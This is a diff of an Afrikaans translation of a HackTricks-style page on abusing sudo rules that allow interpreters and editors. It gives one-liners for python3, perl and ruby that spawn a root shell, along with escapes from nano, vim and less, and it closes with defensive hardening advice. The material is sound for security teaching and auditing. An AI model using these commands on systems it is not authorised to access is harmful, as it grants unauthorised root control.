@@ -1,18 +1,18 @@
-# Sudo Command Abuse
+# Sudo-opdragmisbruik
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Sudo-toegelate interpreters
 
-As `sudo -l` ’n gebruiker toelaat om ’n interpreter as root uit te voer, behandel dit as direkte code execution. Interpreters is ontwerp om arbitrêre code uit te voer, dus is ’n reël wat `python3`, `perl`, `ruby`, `lua`, `node` of soortgelyke binaries toelaat, gewoonlik gelykstaande aan root command execution, tensy die argumente streng beperk en gevalideer word.
+As `sudo -l` ’n gebruiker toelaat om ’n interpreter as root uit te voer, behandel dit as direkte code execution. Interpreters is ontwerp om arbitrêre code uit te voer, dus is ’n reël wat `python3`, `perl`, `ruby`, `lua`, `node`, of soortgelyke binaries toelaat, gewoonlik gelykstaande aan root command execution, tensy die argumente streng beperk en gevalideer word.
 
-Algemene review-vloei:
+Algemene hersieningsvloei:
 ```bash
 sudo -l
 sudo /usr/bin/python3 -c 'import os; os.system("id")'
 sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
 ```
-Ander voorbeelde van interpreters:
+Ander interpreter-voorbeelde:
 ```bash
 sudo /usr/bin/perl -e 'exec "/bin/sh";'
 sudo /usr/bin/ruby -e 'exec "/bin/sh"'
@@ -22,9 +22,9 @@ Die presiese pad is belangrik. Indien die sudo-reël `/usr/bin/python3` toelaat,
 ```bash
 sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
 ```
-## Editors wat deur Sudo toegelaat word
+## Sudo-toegelate editors
 
-As `sudo -l` ’n gebruiker toelaat om ’n interaktiewe editor as root uit te voer, behandel dit as ’n command-execution-oppervlak, nie as ’n onskadelike lêerwysigingstoestemming nie. Editors kan dikwels shell commands uitvoer, arbitrêre lêers lees, arbitrêre lêers skryf, of eksterne helpers vanuit die editor aanroep.
+As `sudo -l` ’n gebruiker toelaat om ’n interaktiewe editor as root uit te voer, hanteer dit as ’n command-execution-oppervlak, nie as ’n onskadelike lêerwysigingsreg nie. Editors kan dikwels shell commands uitvoer, arbitrêre lêers lees, arbitrêre lêers skryf, of eksterne helpers vanuit die editor aanroep.
 
 Algemene hersieningsvloei:
 ```bash
@@ -35,7 +35,7 @@ sudo /usr/bin/less /etc/hosts
 ```
 ### Nano-opdraguitvoering
 
-Wanneer `nano` deur sudo toegelaat word, kan opdraguitvoering vanaf die redigeerder-koppelvlak moontlik wees:
+Wanneer `nano` deur sudo toegelaat word, kan opdraguitvoering vanaf die redigeerder-koppelvlak bereikbaar wees:
 ```text
 Ctrl+R
 Ctrl+X
@@ -45,26 +45,27 @@ Verskaf dan 'n opdrag soos:
 id
 /bin/sh
 ```
-Op sommige terminals moet 'n interactive shell moontlik standaardstrome herlei:
+Op sommige terminale mag ’n interaktiewe shell vereis dat standaardstrome herlei word:
 ```bash
 reset; /bin/sh 1>&0 2>&0
 ```
-Die presiese sleutelvolgorde kan volgens die nano-weergawe en bouopsies verskil, maar die sekuriteitskwessie bly dieselfde: die editor loop as root en kan eksterne bevele uitvoer.
+Die presiese sleutelvolgorde kan volgens die nano-weergawe en bou-opsies verskil, maar die sekuriteitskwessie bly dieselfde: die redigeerder loop as root en kan eksterne opdragte uitvoer.
 
-### Ander algemene editor-ontsnappings
+### Ander algemene redigeerder-ontsnappings
 
-Vim-style editors stel gewoonlik beveluitvoering via `:!` beskikbaar:
+Vim-styl-redigeerders stel gewoonlik opdraguitvoering deur middel van `:!` beskikbaar:
 ```text
 :!/bin/sh
 ```
-Pagers soos `less` kan ook shell execution blootstel:
+Pagers soos `less` kan ook shell-uitvoering blootstel:
 ```text
 !/bin/sh
 ```
-## Verdedigingsnotas
+## Verdedigingsaantekeninge
 
 - Vermy die toekenning van interpreters of interaktiewe editors deur sudo.
-- Verkies vaste, root-owned wrappers wat een beperkte administratiewe handeling uitvoer.
-- Indien ’n interpreter onvermydelik is, beperk die presiese script-pad en verhoed gebruikerbeheerde argumente, skryfbare imports, `PYTHONPATH` en onveilige omgewingsbewaring.
-- Indien lêerredigering vereis word, beperk die presiese lêerpad en oorweeg `sudoedit` met gepatchte sudo-weergawes en streng omgewingshantering.
-- Hersien `SETENV`, `env_keep`, skryfbare werkgidse, skryfbare module/import-paaie, `NOEXEC`, `use_pty` en logging, maar moenie dit as ’n volledige sandbox beskou nie.
+- Verkies vaste wrappers wat deur root besit word en een beperkte administratiewe handeling uitvoer.
+- Indien ’n interpreter onvermydelik is, beperk die presiese script-pad en voorkom gebruikerbeheerde argumente, skryfbare imports, `PYTHONPATH` en onveilige omgewingsbewaring.
+- Indien lêerredigering vereis word, beperk die presiese lêerpad en oorweeg `sudoedit` met gepatchde sudo-weergawes en streng omgewingshantering.
+- Hersien `SETENV`, `env_keep`, skryfbare werkgidse, skryfbare module-/import-paaie, `NOEXEC`, `use_pty` en logging, maar moenie dit as ’n volledige sandbox beskou nie.
+{{#include ../../banners/hacktricks-training.md}}
